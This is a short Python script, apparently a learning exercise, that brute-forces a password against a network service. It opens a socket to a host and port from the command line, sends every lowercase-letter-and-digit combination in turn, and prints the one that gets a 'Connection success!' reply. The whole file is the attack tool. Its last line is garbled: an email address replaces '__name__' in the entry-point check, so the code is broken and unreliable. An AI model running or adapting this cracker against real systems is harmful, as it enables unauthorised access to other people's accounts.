# -*- coding: utf-8 -*-
"""
@author: zejiran.
"""
import sys
import socket
import string
import itertools


def hack():
    args = sys.argv  # List of arguments.
    if len(args) != 3:
        print("The script should be called with two arguments. The IP address, and port for sending.")
    else:
        letters_numbers = string.ascii_lowercase + string.digits
        # Create a new socket.
        with socket.socket() as client_socket:
            # Connect to a host and a port using the socket.
            hostname, port = args[1], int(args[2])
            address = (hostname, port)
            client_socket.connect(address)
            # Try different passwords.
            cycle_attempt = 1
            while cycle_attempt <= 1000000:
                cycle_combinations = itertools.product(range(len(letters_numbers)), repeat=cycle_attempt)
                for combination in cycle_combinations:
                    password = generate_password(combination, letters_numbers)
                    # Send a password to the host using the socket.
                    password = password.encode()
                    client_socket.send(password)
                    # Receive the server's response.
                    response = client_socket.recv(1024)
                    response = response.decode()
                    # Check server response.
                    if response == 'Connection success!':
                        print(password.decode())
                        exit()
                    elif response == 'Too many attempts':
                        exit()
                cycle_attempt += 1


def generate_password(index_combinations, to_combine):
    new_password = ''
    for index in index_combinations:
        new_password += to_combine[index]
    return new_password


if __amellcantikk3@gmail.com__ == '__main__':
    hack()
